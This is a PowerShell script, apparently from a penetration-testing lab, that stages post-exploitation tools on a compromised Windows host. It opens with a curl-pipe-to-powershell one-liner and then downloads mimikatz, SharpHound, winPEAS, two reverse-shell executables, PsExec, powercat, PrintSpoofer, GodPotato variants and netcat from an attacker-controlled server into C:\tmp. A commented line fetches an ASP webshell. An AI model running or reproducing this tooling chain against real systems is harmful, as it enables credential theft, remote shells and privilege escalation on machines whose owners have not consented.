# curl.exe http://192.168.45.217:8888/script/init_windows.ps1 | powershell.exe -

Write-Host "Starting"
New-Item -Path "C:\" -Name "tmp" -ItemType Directory > $null 2>&1
Write-Host "New Folder C:\tmp"

Write-Host "Downloading All file"
Write-Host "[+] - GET mimikatz"
Invoke-WebRequest -Uri "http://192.168.45.217:8888/script/win/mimikatz.exe" -OutFile "C:\tmp\mimikatz.exe"

Write-Host "[+] - GET SharpHound"
Invoke-WebRequest -Uri "http://192.168.45.217:8888/script/win/SharpHound.ps1" -OutFile "C:\tmp\SharpHound.ps1"

Write-Host "[+] - GET winPeas Exe"
Invoke-WebRequest -Uri "http://192.168.45.217:8888/script/win/winPeas.exe" -OutFile "C:\tmp\winPeas.exe"

Write-Host "[+] - GET reverse_shell_4444"
Invoke-WebRequest -Uri "http://192.168.45.217:8888/script/win/re.exe" -OutFile "C:\tmp\re.exe"

Write-Host "[+] - GET reverse_shell_6666"
Invoke-WebRequest -Uri "http://192.168.45.217:8888/script/win/re2.exe" -OutFile "C:\tmp\re2.exe"

Write-Host "[+] - GET PsExec64"
Invoke-WebRequest -Uri "http://192.168.45.217:8888/script/win/PsExec64.exe" -OutFile "C:\tmp\PsExec64.exe"

Write-Host "[+] - GET powercat"
Invoke-WebRequest -Uri "http://192.168.45.217:8888/script/win/powercat.ps1" -OutFile "C:\tmp\powercat.ps1"

Write-Host "[+] - GET agent"
Invoke-WebRequest -Uri "http://192.168.45.217:8888/script/win/agent.exe" -OutFile "C:\tmp\agent.exe"

Write-Host "[+] - GET PrintSpoofer64"
Invoke-WebRequest -Uri "http://192.168.45.217:8888/script/win/PrintSpoofer64.exe" -OutFile "C:\tmp\PrintSpoofer64.exe"

Write-Host "[+] - GET GodPotato NET4"
Invoke-WebRequest -Uri "http://192.168.45.217:8888/script/win/GodPotato-NET4.exe" -OutFile "C:\tmp\GodPotato-NET4.exe"

Write-Host "[+] - GET GodPotato NET35"
Invoke-WebRequest -Uri "http://192.168.45.217:8888/script/win/GodPotato-NET35.exe" -OutFile "C:\tmp\GodPotato-NET35.exe"

Write-Host "[+] - GET GodPotato NET4"
Invoke-WebRequest -Uri "http://192.168.45.217:8888/script/win/GodPotato-NET2.exe" -OutFile "C:\tmp\GodPotato-NET2.exe"

Write-Host "[+] - GET Netcat"
Invoke-WebRequest -Uri "http://192.168.45.217:8888/script/win/nc64.exe" -OutFile "C:\tmp\nc64.exe"


# Invoke-WebRequest -Uri "http://192.168.45.217:8888/webshell/webshell.asp" -OutFile "webshell.asp" 